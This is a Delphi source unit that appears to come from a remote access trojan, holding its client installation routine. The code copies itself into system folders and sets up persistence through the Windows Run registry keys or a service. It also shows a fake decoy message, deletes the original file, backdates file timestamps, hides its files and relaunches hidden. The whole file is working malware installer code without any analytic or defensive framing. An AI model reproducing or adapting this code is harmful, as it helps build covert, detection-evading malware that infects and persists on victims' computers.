unit UnitInstallation;

interface

uses
  Windows, UnitConstants, UnitConfiguration, UnitFunctions, UnitRegistryEditor,
  UnitServices;

function InstallClient: string;

implementation

function InstallClient: string;
var
  TmpPath: string;
begin
  Result := ParamStr(0);
  if not _Install then Exit;

  if _Destination = 'Windows' then _Destination := WinDir else
  if _Destination = 'System' then _Destination := SysDir else
  if _Destination = 'Temp' then _Destination := TmpDir else
  if _Destination = 'Root' then _Destination := RootDir else
  if _Destination = 'AppData' then _Destination := AppDataDir else
  if _Destination = 'Program files' then _Destination := ProgramFilesDir else
  begin
    if _Destination[Length(_Destination)] <> '\' then _Destination := _Destination + '\';
    if CreatePath(_Destination) = False then _Destination := TmpDir;
  end;

  if _Destination[Length(_Destination)] <> '\' then _Destination := _Destination + '\';
  TmpPath := _Destination + _FolderName;
  if DirectoryExists(TmpPath) then Exit;
  if CreateDirectory(PChar(TmpPath), nil) = False then Exit;
  TmpPath := TmpPath + '\' + _FileName;

  if CopyFile(PChar(ParamStr(0)), PChar(TmpPath), False) = True then  Result := TmpPath else
  begin
    Result := ParamStr(0);
    
    TmpPath := TmpDir + _FolderName;
    if DirectoryExists(TmpPath) then Exit;
    if CreateDirectory(PChar(TmpPath), nil) = False then Exit;
    TmpPath := TmpPath + '\' + _FileName;
    
    if CopyFile(PChar(ParamStr(0)), PChar(TmpPath), False) = True then  Result := TmpPath else
      Result := ParamStr(0);
  end;

  if _Startup then
  begin
    if _StartupOptions = 0 then
    begin
      if _HKCUStartup then
      begin
        if ReadKeyString(HKEY_CURRENT_USER, PChar('Software\Microsoft\Windows\CurrentVersion\Run\'), _StartupKey, '') <> Result then
        AddRegValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\', _StartupKey, 'REG_SZ', Result);
      end;

      if _HKLMStartup then
      begin
        if ReadKeyString(HKEY_LOCAL_MACHINE, PChar('Software\Microsoft\Windows\CurrentVersion\Run\'), _StartupKey, '') <> Result then
        AddRegValue('HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\', _StartupKey, 'REG_SZ', Result);
      end;

      if _PoliciesStartup then
      begin
        if ReadKeyString(HKEY_LOCAL_MACHINE, PChar('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\'), _StartupKey, '') <> Result then
        AddRegValue('HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\', _StartupKey, 'REG_SZ', Result);
      end;
    end
    else InstallService(_ServiceName, _ServiceName, Result, _ServiceDesc, 2);
  end;
  
  if _FakeMessage then
  ShowMsg(0, _MessageParams[1], _MessageParams[0], StrToInt(_MessageParams[2]), StrToInt(_MessageParams[3]));
  if _Melt then if Result <> ParamStr(0) then MySelfDelete;

  if _ChangeDate then
  begin
    ChangeFileTime(Result);
    ChangeDirTime(ExtractFilePath(Result));
  end;

  if _Hide then
  begin
    HideFileName(Result);
    HideFileName(ExtractFilePath(Result));
  end;
  
  if _WaitReboot then ExitProcess(0) else
  begin
    MyShellExecute(Result, '', SW_HIDE);
    ExitProcess(0);
  end;
end;

end.
